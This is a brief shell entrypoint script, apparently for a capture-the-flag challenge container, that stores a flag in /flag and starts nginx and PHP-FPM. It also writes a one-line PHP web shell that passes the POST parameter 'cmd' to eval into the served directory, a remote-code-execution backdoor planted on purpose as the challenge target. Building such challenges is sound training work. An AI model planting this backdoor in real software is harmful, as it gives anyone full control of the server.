#!/bin/sh
echo "$FLAG" > /flag
unset FLAG
echo '<?php eval($_POST["cmd"]); ' > /home/ctf/scripts/index.php
nginx
/app/php-bin/sbin/php-fpm -c /app/php-bin/etc/php.ini --nodaemonize